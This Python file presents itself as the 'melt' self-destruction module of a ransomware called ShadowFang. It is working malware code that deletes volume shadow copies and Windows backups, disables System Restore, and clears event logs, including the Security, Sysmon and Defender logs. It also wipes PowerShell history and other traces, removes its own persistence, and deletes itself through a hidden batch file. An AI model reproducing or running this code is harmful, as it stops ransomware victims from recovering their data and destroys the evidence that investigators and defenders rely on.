#!/usr/bin/env python3
"""
SHADOWFANG CORE - MELT.PY
Complete self-destruction and cleanup module
Deletes ransomware, wipes traces, destroys logs, clears evidence
"""

import os
import sys
import time
import ctypes
import shutil
import winreg
import subprocess
import threading
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== FILE DESTROYER ====================

class FileDestroyer:
    """Secure file destruction and overwriting"""
    
    def __init__(self):
        self.deleted_files = []
        self.failed_deletions = []
    
    def secure_overwrite(self, filepath, passes=1):
        """Overwrite file with random data before deletion"""
        try:
            if not os.path.exists(filepath):
                return False
            
            file_size = os.path.getsize(filepath)
            
            # Overwrite with random data
            with open(filepath, 'wb') as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            return True
        except Exception as e:
            logger.warning(f"Secure overwrite failed for {filepath}: {e}")
            return False
    
    def secure_delete(self, filepath, overwrite=True):
        """Securely delete file"""
        try:
            if not os.path.exists(filepath):
                return False
            
            # Overwrite if requested
            if overwrite:
                self.secure_overwrite(filepath)
            
            # Delete file
            os.remove(filepath)
            
            self.deleted_files.append(filepath)
            logger.info(f"File deleted: {filepath}")
            return True
            
        except Exception as e:
            self.failed_deletions.append(filepath)
            logger.warning(f"File deletion failed: {filepath} - {e}")
            return False
    
    def secure_delete_directory(self, directory, overwrite=True):
        """Securely delete entire directory"""
        try:
            if not os.path.exists(directory):
                return False
            
            # Delete all files in directory
            for root, dirs, files in os.walk(directory, topdown=False):
                for file in files:
                    filepath = os.path.join(root, file)
                    self.secure_delete(filepath, overwrite)
                
                for dir_name in dirs:
                    dir_path = os.path.join(root, dir_name)
                    try:
                        os.rmdir(dir_path)
                    except:
                        pass
            
            # Delete directory itself
            try:
                os.rmdir(directory)
            except:
                pass
            
            return True
        except Exception as e:
            logger.warning(f"Directory deletion failed: {directory} - {e}")
            return False
    
    def delete_batch_file(self):
        """Create batch file to delete self after exit"""
        try:
            current_path = CoreUtils.get_executable_path()
            
            batch_content = f"""@echo off
timeout /t 2 /nobreak >nul
del /f /q "{current_path}"
del /f /q "{sys.executable}"
del /f /q "%0"
rmdir /s /q "{os.path.dirname(current_path)}"
"""
            
            batch_path = os.path.join(
                os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                'cleanup.bat'
            )
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            # Execute batch file hidden
            subprocess.Popen(
                batch_path,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            logger.info("Cleanup batch file created and executed")
            return True
            
        except Exception as e:
            logger.warning(f"Batch file creation failed: {e}")
            return False

# ==================== LOG DESTROYER ====================

class LogDestroyer:
    """Destroy Windows event logs and system logs"""
    
    def __init__(self):
        self.logs_cleared = []
        self.logs_failed = []
    
    def clear_event_logs(self):
        """Clear all Windows event logs"""
        try:
            # Use wevtutil to clear logs
            log_types = [
                'Application',
                'Security',
                'System',
                'Setup',
                'ForwardedEvents',
                'Windows PowerShell',
                'Microsoft-Windows-Sysmon/Operational',
                'Microsoft-Windows-TaskScheduler/Operational',
                'Microsoft-Windows-Windows Defender/Operational'
            ]
            
            for log_type in log_types:
                try:
                    subprocess.run(
                        f'wevtutil cl "{log_type}"',
                        shell=True,
                        capture_output=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    self.logs_cleared.append(log_type)
                except:
                    self.logs_failed.append(log_type)
            
            logger.info(f"Event logs cleared: {len(self.logs_cleared)}/{len(log_types)}")
            return True
            
        except Exception as e:
            logger.warning(f"Event log clearing failed: {e}")
            return False
    
    def clear_powershell_history(self):
        """Clear PowerShell command history"""
        try:
            history_path = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt'
            )
            
            if os.path.exists(history_path):
                self.secure_delete(history_path)
            
            return True
        except:
            return False
    
    def clear_prefetch(self):
        """Clear Windows prefetch files"""
        try:
            prefetch_dir = 'C:\\Windows\\Prefetch'
            
            if os.path.exists(prefetch_dir):
                for file in os.listdir(prefetch_dir):
                    if 'SHADOWFANG' in file.upper() or 'RANSOM' in file.upper():
                        filepath = os.path.join(prefetch_dir, file)
                        try:
                            os.remove(filepath)
                        except:
                            pass
            
            return True
        except:
            return False
    
    def clear_recent_documents(self):
        """Clear recent documents history"""
        try:
            recent_dir = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft\\Windows\\Recent'
            )
            
            if os.path.exists(recent_dir):
                for file in os.listdir(recent_dir):
                    filepath = os.path.join(recent_dir, file)
                    try:
                        os.remove(filepath)
                    except:
                        pass
            
            return True
        except:
            return False
    
    def clear_memory_dumps(self):
        """Clear memory dump files"""
        try:
            dump_paths = [
                'C:\\Windows\\MEMORY.DMP',
                'C:\\Windows\\Minidump',
                'C:\\Windows\\LiveKernelReports'
            ]
            
            for path in dump_paths:
                if os.path.exists(path):
                    if os.path.isfile(path):
                        self.secure_delete(path)
                    else:
                        self.secure_delete_directory(path)
            
            return True
        except:
            return False
    
    def destroy_all_logs(self):
        """Destroy all logs and traces"""
        methods = [
            self.clear_event_logs,
            self.clear_powershell_history,
            self.clear_prefetch,
            self.clear_recent_documents,
            self.clear_memory_dumps
        ]
        
        for method in methods:
            try:
                method()
            except:
                continue
        
        logger.info("All logs destroyed")
        return True

# ==================== REGISTRY CLEANER ====================

class RegistryCleaner:
    """Remove ransomware registry entries"""
    
    def __init__(self):
        self.cleaned_keys = []
        self.failed_keys = []
    
    def remove_run_entries(self):
        """Remove Run registry entries"""
        try:
            run_entries = [
                'WindowsUpdate',
                'SecurityHealth',
                'SystemHelper',
                'NetworkService',
                'DeviceManager'
            ]
            
            # Current User
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            for entry in run_entries:
                try:
                    winreg.DeleteValue(key, entry)
                    self.cleaned_keys.append(f"HKCU\\Run\\{entry}")
                except:
                    continue
            
            winreg.CloseKey(key)
            
            # Local Machine
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            for entry in run_entries:
                try:
                    winreg.DeleteValue(key, entry)
                    self.cleaned_keys.append(f"HKLM\\Run\\{entry}")
                except:
                    continue
            
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def remove_scheduled_tasks(self):
        """Remove scheduled tasks"""
        try:
            tasks = [
                'WindowsUpdateTask',
                'SecurityHealthTask',
                'SystemHelperTask'
            ]
            
            for task in tasks:
                subprocess.run(
                    f'schtasks /delete /tn "{task}" /f',
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            return True
        except:
            return False
    
    def remove_services(self):
        """Remove Windows services"""
        try:
            services = [
                'WindowsUpdate',
                'SecurityHealth',
                'SystemHelper'
            ]
            
            for service in services:
                subprocess.run(
                    f'sc stop {service}',
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                subprocess.run(
                    f'sc delete {service}',
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            return True
        except:
            return False
    
    def remove_policies(self):
        """Remove policy restrictions"""
        try:
            # Restore Task Manager
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
            # Restore Explorer
            key = winreg.CreateKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            )
            winreg.SetValueEx(key, "NoRun", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "NoDrives", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            
            return True
        except:
            return False
    
    def clean_all_registry(self):
        """Clean all registry traces"""
        methods = [
            self.remove_run_entries,
            self.remove_scheduled_tasks,
            self.remove_services,
            self.remove_policies
        ]
        
        for method in methods:
            try:
                method()
            except:
                continue
        
        logger.info("Registry cleaned")
        return True

# ==================== SHADOW COPY DESTROYER ====================

class ShadowCopyDestroyer:
    """Destroy volume shadow copies and backups"""
    
    def __init__(self):
        self.shadow_copies_deleted = False
        self.backups_deleted = False
    
    def delete_shadow_copies(self):
        """Delete all volume shadow copies"""
        try:
            commands = [
                'vssadmin delete shadows /all /quiet',
                'wmic shadowcopy delete',
                'vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB'
            ]
            
            for cmd in commands:
                subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            self.shadow_copies_deleted = True
            logger.info("Shadow copies deleted")
            return True
        except:
            return False
    
    def delete_windows_backups(self):
        """Delete Windows backup catalogs"""
        try:
            commands = [
                'wbadmin delete catalog -quiet',
                'wbadmin delete systemstatebackup -keepVersions:0 -quiet',
                'wbadmin delete backup -keepVersions:0 -quiet'
            ]
            
            for cmd in commands:
                subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            self.backups_deleted = True
            logger.info("Windows backups deleted")
            return True
        except:
            return False
    
    def disable_system_restore(self):
        """Disable System Restore permanently"""
        try:
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f',
                'sc stop srservice',
                'sc config srservice start= disabled'
            ]
            
            for cmd in commands:
                subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            
            return True
        except:
            return False
    
    def destroy_all_recovery(self):
        """Destroy all recovery options"""
        methods = [
            self.delete_shadow_copies,
            self.delete_windows_backups,
            self.disable_system_restore
        ]
        
        for method in methods:
            try:
                method()
            except:
                continue
        
        logger.info("All recovery options destroyed")
        return True

# ==================== RECYCLE BIN CLEANER ====================

class RecycleBinCleaner:
    """Empty recycle bin securely"""
    
    def __init__(self):
        self.recycle_bin_cleared = False
    
    def empty_recycle_bin(self):
        """Empty recycle bin on all drives"""
        try:
            import ctypes
            from ctypes import wintypes
            
            # SHEmptyRecycleBinW
            ctypes.windll.shell32.SHEmptyRecycleBinW(
                None,
                None,
                0x00000001  # SHERB_NOCONFIRMATION
            )
            
            self.recycle_bin_cleared = True
            logger.info("Recycle bin emptied")
            return True
        except:
            return False
    
    def secure_empty_recycle_bin(self):
        """Securely empty recycle bin"""
        try:
            # Get recycle bin path
            recycle_bins = [
                'C:\\$Recycle.Bin',
                'D:\\$Recycle.Bin',
                'E:\\$Recycle.Bin'
            ]
            
            for recycle_bin in recycle_bins:
                if os.path.exists(recycle_bin):
                    for root, dirs, files in os.walk(recycle_bin):
                        for file in files:
                            filepath = os.path.join(root, file)
                            try:
                                FileDestroyer().secure_delete(filepath)
                            except:
                                continue
            
            return True
        except:
            return self.empty_recycle_bin()

# ==================== MAIN MELT MANAGER ====================

class MeltManager:
    """Main self-destruction orchestrator"""
    
    def __init__(self):
        self.file_destroyer = FileDestroyer()
        self.log_destroyer = LogDestroyer()
        self.registry_cleaner = RegistryCleaner()
        self.shadow_destroyer = ShadowCopyDestroyer()
        self.recycle_cleaner = RecycleBinCleaner()
        self.melt_complete = False
        self.melt_thread = None
    
    def melt(self, delay=10, overwrite=True):
        """Execute full self-destruction sequence"""
        
        def melt_worker():
            try:
                logger.info(f"Melt sequence starting in {delay} seconds...")
                time.sleep(delay)
                
                # Phase 1: Destroy recovery options
                logger.info("Phase 1: Destroying recovery options")
                self.shadow_destroyer.destroy_all_recovery()
                
                # Phase 2: Clear logs
                logger.info("Phase 2: Clearing logs")
                self.log_destroyer.destroy_all_logs()
                
                # Phase 3: Clean registry
                logger.info("Phase 3: Cleaning registry")
                self.registry_cleaner.clean_all_registry()
                
                # Phase 4: Empty recycle bin
                logger.info("Phase 4: Emptying recycle bin")
                self.recycle_cleaner.empty_recycle_bin()
                
                # Phase 5: Delete ransomware files
                logger.info("Phase 5: Deleting ransomware files")
                current_path = CoreUtils.get_executable_path()
                self.file_destroyer.secure_delete(current_path, overwrite)
                
                # Delete generated files
                generated_files = [
                    os.path.join(os.environ.get('APPDATA', ''), 'svchost.exe'),
                    os.path.join(os.environ.get('APPDATA', ''), 'system.exe'),
                    os.path.join(os.environ.get('TEMP', ''), 'cleanup.bat')
                ]
                
                for file in generated_files:
                    self.file_destroyer.secure_delete(file, overwrite)
                
                # Phase 6: Create batch for final cleanup
                logger.info("Phase 6: Final cleanup")
                self.file_destroyer.delete_batch_file()
                
                self.melt_complete = True
                logger.info("Melt sequence complete - ransomware destroyed")
                
                # Force exit
                os._exit(0)
                
            except Exception as e:
                logger.error(f"Melt sequence failed: {e}")
                # Force exit anyway
                os._exit(1)
        
        # Start melt in background thread
        self.melt_thread = threading.Thread(target=melt_worker)
        self.melt_thread.daemon = True
        self.melt_thread.start()
        
        return True
    
    def quick_melt(self):
        """Quick melt - minimal cleanup, fast exit"""
        try:
            # Delete current executable
            current_path = CoreUtils.get_executable_path()
            
            batch_content = f"""@echo off
timeout /t 1 /nobreak >nul
del /f /q "{current_path}"
del /f /q %0
"""
            
            batch_path = os.path.join(
                os.environ.get('TEMP', 'C:\\Windows\\Temp'),
                'quick_cleanup.bat'
            )
            
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            subprocess.Popen(
                batch_path,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            os._exit(0)
            return True
            
        except:
            os._exit(1)
            return False
    
    def get_melt_status(self):
        """Get melt status"""
        return {
            'melt_complete': self.melt_complete,
            'deleted_files': len(self.file_destroyer.deleted_files),
            'failed_deletions': len(self.file_destroyer.failed_deletions),
            'logs_cleared': len(self.log_destroyer.logs_cleared),
            'registry_cleaned': len(self.registry_cleaner.cleaned_keys)
        }

# ==================== SINGLETON INSTANCE ====================

melt_manager = MeltManager()

# ==================== EXPORT ====================

__all__ = [
    'FileDestroyer',
    'LogDestroyer',
    'RegistryCleaner',
    'ShadowCopyDestroyer',
    'RecycleBinCleaner',
    'MeltManager',
    'melt_manager'
]